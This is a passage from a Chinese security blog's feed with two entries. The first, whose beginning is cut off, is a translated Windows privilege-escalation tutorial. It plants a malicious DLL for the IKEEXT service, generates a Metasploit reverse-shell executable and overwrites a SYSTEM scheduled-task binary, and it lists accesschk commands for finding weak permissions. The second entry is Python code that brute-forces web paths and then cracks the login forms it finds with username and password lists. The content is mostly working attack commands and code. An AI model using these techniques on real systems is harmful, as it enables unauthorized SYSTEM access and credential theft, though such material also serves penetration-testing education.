“lport”=&gt;”9988”}</p><pre><code>将DLL传输到目标机器后，我们需要做的就是将其重命名为wlbsctrl.dll并将其移动到“C:\Python27”。一旦完成，我们需要耐心地等待机器重新启动（或者我们可以尝试强制重启），我们将获得一个SYSTEM shell。</code></pre><h1 id="Again-this-is-as-low-privilege-user1"><a href="#Again-this-is-as-low-privilege-user1" class="headerlink" title="Again, this is as low privilege user1."></a>Again, this is as low privilege user1.</h1><p>C:\Users\user1\Desktop&gt; dir</p><p> Volume in drive C has no label.<br> Volume Serial Number is 948D-A98F</p><p> Directory of C:\Users\user1\Desktop</p><p>02/18/2014  01:49 PM    <dir>          .<br>02/18/2014  01:49 PM    <dir>          ..<br>04/22/2013  09:39 AM           331,888 accesschk.exe<br>02/18/2014  12:38 PM            14,336 evil.dll<br>01/25/2014  12:46 AM            36,864 fubar.exe<br>01/22/2014  08:17 AM    <dir>          incognito2<br>06/30/2011  01:52 PM         1,667,584 ncat.exe<br>11/22/2013  07:39 PM             1,225 wmic_info.bat<br>               5 File(s)      2,051,897 bytes<br>               3 Dir(s)      73,052,160 bytes free</dir></dir></dir></p><p>C:\Users\user1\Desktop&gt; copy evil.dll C:\Python27\wlbsctrl.dll</p><pre><code>    1 file(s) copied.</code></pre><p>C:\Users\user1\Desktop&gt; dir C:\Python27</p><p> Volume in drive C has no label.<br> Volume Serial Number is 948D-A98F</p><p> Directory of C:\Python27</p><p>02/18/2014  01:53 PM    <dir>          .<br>02/18/2014  01:53 PM    <dir>          ..<br>10/20/2012  02:52 AM    <dir>          DLLs<br>10/20/2012  02:52 AM    <dir>          Doc<br>10/20/2012  02:52 AM    <dir>          include<br>01/28/2014  03:45 AM    <dir>          Lib<br>10/20/2012  02:52 AM    <dir>          libs<br>04/10/2012  11:34 PM            40,092 LICENSE.txt<br>04/10/2012  11:18 PM           310,875 NEWS.txt<br>04/10/2012  11:31 PM            26,624 python.exe<br>04/10/2012  11:31 PM            27,136 pythonw.exe<br>04/10/2012  11:18 PM            54,973 README.txt<br>10/20/2012  02:52 AM    <dir>          tcl<br>10/20/2012  02:52 AM    <dir>          Tools<br>04/10/2012  11:31 PM            49,664 w9xpopen.exe<br>02/18/2014  12:38 PM            14,336 wlbsctrl.dll<br>               7 File(s)        523,700 bytes<br>               9 Dir(s)      73,035,776 bytes free</dir></dir></dir></dir></dir></dir></dir></dir></dir></p><pre><code>一切都已设置，我们现在需要做的就是等待系统重启。出于演示目的，我在下面包含了一个屏幕截图，我使用管理员命令提示符手动重启服务。[![img](http://www.fuzzysecurity.com/tutorials/images/priv03_big.png)Service Shell (IKEEXT)对于我们的最后一个例子，我们将查看计划的任务。回顾我们之前收集的结果，我们遇到了以下条目。</code></pre><p>HostName:                             B33F<br>TaskName:                             \LogGrabberTFTP<br>Next Run Time:                        2/19/2014 9:00:00 AM<br>Status:                               Ready<br>Logon Mode:                           Interactive/Background<br>Last Run Time:                        N/A<br>Last Result:                          1<br>Author:                               B33F\b33f<br>Task To Run:                          E:\GrabLogs\tftp.exe 10.1.1.99 GET log.out E:\GrabLogs\Logs\log.txt<br>Start In:                             N/A<br>Comment:                              N/A<br>Scheduled Task State:                 Enabled<br>Idle Time:                            Disabled<br>Power Management:                     Stop On Battery Mode, No Start On Batteries<br>Run As User:                          SYSTEM<br>Delete Task If Not Rescheduled:       Enabled<br>Stop Task If Runs X Hours and X Mins: 72:00:00<br>Schedule:                             Scheduling data is not available in this format.<br>Schedule Type:                        Daily<br>Start Time:                           9:00:00 AM<br>Start Date:                           2/17/2014<br>End Date:                             N/A<br>Days:                                 Every 1 day(s)<br>Months:                               N/A<br>Repeat: Every:                        Disabled<br>Repeat: Until: Time:                  Disabled<br>Repeat: Until: Duration:              Disabled<br>Repeat: Stop If Still Running:        Disabled</p><pre><code>盒子上似乎有一个TFTP客户端连接到远程主机并抓取某种日志文件。我们可以看到此任务每天上午9点运行，并以SYSTEM级别权限（ouch）运行。让我们看看我们是否具有对此文件夹的写入权限。</code></pre><p>C:\Users\user1\Desktop&gt; accesschk.exe -dqv “E:\GrabLogs”</p><p>E:\GrabLogs<br>  Medium Mandatory Level (Default) [No-Write-Up]<br>  RW BUILTIN\Administrators<br>        FILE_ALL_ACCESS<br>  RW NT AUTHORITY\SYSTEM<br>        FILE_ALL_ACCESS<br>  RW NT AUTHORITY\Authenticated Users<br>        FILE_ADD_FILE<br>        FILE_ADD_SUBDIRECTORY<br>        FILE_LIST_DIRECTORY<br>        FILE_READ_ATTRIBUTES<br>        FILE_READ_EA<br>        FILE_TRAVERSE<br>        FILE_WRITE_ATTRIBUTES<br>        FILE_WRITE_EA<br>        DELETE<br>        SYNCHRONIZE<br>        READ_CONTROL<br>  R  BUILTIN\Users<br>        FILE_LIST_DIRECTORY<br>        FILE_READ_ATTRIBUTES<br>        FILE_READ_EA<br>        FILE_TRAVERSE<br>        SYNCHRONIZE<br>        READ_CONTROL</p><p>C:\Users\user1\Desktop&gt; dir “E:\GrabLogs”</p><p> Volume in drive E is More<br> Volume Serial Number is FD53-2F00</p><p> Directory of E:\GrabLogs</p><p>02/18/2014  11:34 PM    <dir>          .<br>02/18/2014  11:34 PM    <dir>          ..<br>02/18/2014  11:34 PM    <dir>          Logs<br>02/18/2014  09:21 PM           180,736 tftp.exe<br>               1 File(s)        180,736 bytes<br>               3 Dir(s)   5,454,602,240 bytes free</dir></dir></dir></p><pre><code>显然，这是一个严重的配置问题，不需要将此任务作为SYSTEM运行，但更糟糕的是任何经过身份验证的用户都具有对该文件夹的写入权限。理想情况下，我会抓住TFTP客户端，后备PE可执行文件，同时确保它仍能完美运行，然后将其放回目标计算机上。但是，出于本示例的目的，我们可以使用metasploit生成的可执行文件简单地覆盖二进制文件。</code></pre><p>root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=’127.0.0.1’ lport=’9988’ O</p><pre><code>   Name: Windows Command Shell, Reverse TCP Inline Module: payload/windows/shell_reverse_tcp</code></pre><p>   Platform: Windows<br>       Arch: x86<br>Needs Admin: No<br> Total size: 314<br>       Rank: Normal</p><p>Provided by:<br>  vlad902 <a href="mailto:&#118;&#108;&#x61;&#x64;&#57;&#x30;&#50;&#x40;&#103;&#x6d;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#109;">&#118;&#108;&#x61;&#x64;&#57;&#x30;&#50;&#x40;&#103;&#x6d;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#109;</a><br>  sf <a href="mailto:&#115;&#x74;&#x65;&#x70;&#104;&#101;&#x6e;&#x5f;&#x66;&#101;&#119;&#101;&#114;&#x40;&#x68;&#x61;&#x72;&#109;&#x6f;&#x6e;&#x79;&#115;&#x65;&#99;&#x75;&#114;&#x69;&#116;&#121;&#46;&#x63;&#111;&#x6d;">&#115;&#x74;&#x65;&#x70;&#104;&#101;&#x6e;&#x5f;&#x66;&#101;&#119;&#101;&#114;&#x40;&#x68;&#x61;&#x72;&#109;&#x6f;&#x6e;&#x79;&#115;&#x65;&#99;&#x75;&#114;&#x69;&#116;&#121;&#46;&#x63;&#111;&#x6d;</a></p><p>Basic options:<br>Name      Current Setting  Required  Description</p><hr><p>EXITFUNC  process          yes       Exit technique: seh, thread, process, none<br>LHOST     127.0.0.1        yes       The listen address<br>LPORT     9988             yes       The listen port</p><p>Description:<br>  Connect back to attacker and spawn a command shell</p><p>root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=’127.0.0.1’ lport=’9988’ R | msfencode -t<br>exe &gt; /root/Desktop/evil-tftp.exe</p><p>[*] x86/shikata_ga_nai succeeded with size 341 (iteration=1)</p><pre><code>现在剩下的就是上传我们的恶意可执行文件并覆盖“E：\ GrabLogs \ tftp.exe”。一旦完成，我们可以在早上睡个好觉，然后在早上醒来。这里要记住的一件重要事情是我们检查我们试图妥协的盒子上的时间/时区。</code></pre><p>C:\Users\user1\Desktop&gt; dir</p><p> Volume in drive C has no label.<br> Volume Serial Number is 948D-A98F</p><p> Directory of C:\Users\user1\Desktop</p><p>02/19/2014  01:36 AM    <dir>          .<br>02/19/2014  01:36 AM    <dir>          ..<br>04/22/2013  09:39 AM           331,888 accesschk.exe<br>02/19/2014  01:31 AM            73,802 evil-tftp.exe<br>01/25/2014  12:46 AM            36,864 fubar.exe<br>01/22/2014  08:17 AM    <dir>          incognito2<br>06/30/2011  01:52 PM         1,667,584 ncat.exe<br>02/18/2014  12:38 PM            14,336 wlbsctrl.dll<br>11/22/2013  07:39 PM             1,225 wmic_info.bat<br>               6 File(s)      2,125,699 bytes<br>               3 Dir(s)      75,341,824 bytes free</dir></dir></dir></p><p>C:\Users\user1\Desktop&gt; copy evil-tftp.exe E:\GrabLogs\tftp.exe</p><p>Overwrite E:\GrabLogs\tftp.exe? (Yes/No/All): Yes<br>        1 file(s) copied.</p><pre><code>为了演示此操作中的权限提升，我快速转发了系统时间。从下面的屏幕截图中我们可以看到我们在上午9点迅速提供了我们的SYSTEM shell。![img](http://www.fuzzysecurity.com/tutorials/images/priv04_big.png)Schtasks Shell (LogGrabberTFTP)  这两个示例应该让您了解在考虑文件/文件夹权限时我们需要查找的漏洞类型。您需要花时间检查Windows服务，计划任务和启动任务的所有bin路径。我们已经能够看到accesschk是这里的首选工具。在结束之前，我想给你一些关于使用accesschk的最后一点。  </code></pre><h1 id="When-executing-any-of-the-sysinternals-tools-for-the-first-time-the-user-will-be-presented-with-a-GUI"><a href="#When-executing-any-of-the-sysinternals-tools-for-the-first-time-the-user-will-be-presented-with-a-GUI" class="headerlink" title="When executing any of the sysinternals tools for the first time the user will be presented with a GUI"></a>When executing any of the sysinternals tools for the first time the user will be presented with a GUI</h1><p>pop-up to accept the EULA. This is obviously a big problem, however we can add an extra command line flag<br>to automatically accept the EULA.</p><p>accesschk.exe /accepteula … … …</p><h1 id="Find-all-weak-folder-permissions-per-drive"><a href="#Find-all-weak-folder-permissions-per-drive" class="headerlink" title="Find all weak folder permissions per drive."></a>Find all weak folder permissions per drive.</h1><p>accesschk.exe -uwdqs Users c:\<br>accesschk.exe -uwdqs “Authenticated Users” c:\</p><h1 id="Find-all-weak-file-permissions-per-drive"><a href="#Find-all-weak-file-permissions-per-drive" class="headerlink" title="Find all weak file permissions per drive."></a>Find all weak file permissions per drive.</h1><p>accesschk.exe -uwqs Users c:*.<em><br>accesschk.exe -uwqs “Authenticated Users” c:\</em>.*</p><p><code>`</code></p><h2 id="Final-Thoughts"><a href="#Final-Thoughts" class="headerlink" title="Final Thoughts"></a>Final Thoughts</h2><p>  本指南旨在成为Windows权限升级的“基础”。如果你想真正掌握这门课程，你需要投入大量的工作和研究。与测试的所有方面一样，枚举是关键，你对目标的了解越多，你拥有的攻击途径越多，成功率就越高。</p><p>另请注意，您有时可能会将您的权限提升为管理员。从管理员升级到SYSTEM的权限不是问题，您始终可以重新配置服务或创建具有SYSTEM级别权限的计划任务。</p><p>现在出去弹出SYSTEM !!  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;原文链接：&lt;a href=&quot;http://www.fuzzysecurity.com/tutorials/16.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.fuzzysecurity.com/tutorials/16.ht
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>python遍历路径破解表单</title>
    <link href="/2019/03/python%E9%81%8D%E5%8E%86%E8%B7%AF%E5%BE%84%E7%A0%B4%E8%A7%A3%E8%A1%A8%E5%8D%95/"/>
    <id>/2019/03/python遍历路径破解表单/</id>
    <published>2019-03-12T02:35:27.000Z</published>
    <updated>2019-03-12T02:53:37.017Z</updated>
    
    <content type="html"><![CDATA[<h3 id="python遍历路径破解表单"><a href="#python遍历路径破解表单" class="headerlink" title="python遍历路径破解表单"></a>python遍历路径破解表单</h3><p>​    首先是利用python遍历路径，采用字典爆破的形式，当然如果只是单纯的爆破路径，简单写一个多线程脚本就行了。这里考虑如何对爆破到的路径进行第二步利用，此处尝试对猜解到的路径进行表单发现及登陆爆破处理。</p><p>​    首先就是路径爆破，采用多线程队列，爆破路径，判断形式为200响应码。</p><pre><code>        while not self._queue.empty():            queue = self._queue.get(timeout=0.5)            try:                r = requests.get(self.url+queue,timeout=5, headers=self.headers)                if r.status_code == 200:                    print &quot;[200] %s&quot; %(queue)                    soup = BeautifulSoup(r.content,&#39;html.parser&#39;)                    if soup.find(&#39;form&#39;):                        self.brute(soup, queue)</code></pre><p>猜解到路径后交给brute方法处理，方法实现了一个css选择器，获取form表单中的input字段标签，提取标签参数组合成post参数值，然后提取表单中的action跳转页面，如没有页面默认在当前表单页提交。</p><pre><code>input = soup.select(&quot;form input&quot;)            for i in input:                try:                    if i.attrs[&#39;type&#39;] == &quot;hidden&quot;:                        name, value = i.attrs[&#39;name&#39;], i.attrs[&#39;value&#39;]                        list_post.append(name+&#39;=&#39;+value)                    elif i.attrs[&#39;type&#39;] == &#39;password&#39;:                        name = i.attrs[&#39;name&#39;]                        list_post.append(name+&#39;=$$$&#39;)                    else:                        name = i.attrs[&#39;name&#39;]                        list_post.append(name+&#39;=%%%&#39;)                except:                    continue            for i in list_post:                post = post + i + &#39;&amp;&#39;            action = soup.find_all(&#39;form&#39;)            for i in action:                if i[&#39;action&#39;]:                    actiontag = i[&#39;action&#39;]                else:                    actiontag = queue            self.payload(post, actiontag)</code></pre><p>获取参数值后，交给payload方法处理登陆，采用requests库的session登陆。获取cookie，先采用session请求获取cookie后，再采用session携带cookie进行请求提交。然后对输入的验证值进行判断是否为登陆成功。</p><pre><code>        for name in self.username():            post_user = post.replace(&#39;%%%&#39;,name.strip())            for pwd in self.password():                post_pwd = post_user.replace(&#39;$$$&#39;,pwd.strip())                session = requests.Session()                session.get(self.url+&#39;/&#39;+action, headers=self.headers, verify=False)                r = session.post(self.url+&#39;/&#39;+action, data=post_pwd, headers=self.headers, verify=False)                if self.word in r.content:                    print &#39;[username] %s&#39; %name +&#39;\r&#39; + &#39;[password] %s&#39; %pwd                    return</code></pre><p>为了判断是否登陆成功，采用的人为输入判断字符串的形式。也就是脚本执行形式为</p><pre><code>python xxx.py http://xxxx.com xxxxx</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;python遍历路径破解表单&quot;&gt;&lt;a href=&quot;#python遍历路径破解表单&quot; class=&quot;headerlink&quot; title=&quot;python遍历路径破解表单&quot;&gt;&lt;/a&gt;python遍历路径破解表单&lt;/h3&gt;&lt;p&gt;​    首先是利用python遍历路径，采
      
    
    </summary>
    
    
      <category term="python" scheme="/tags/python/"/>
    
  </entry>
  
</feed>
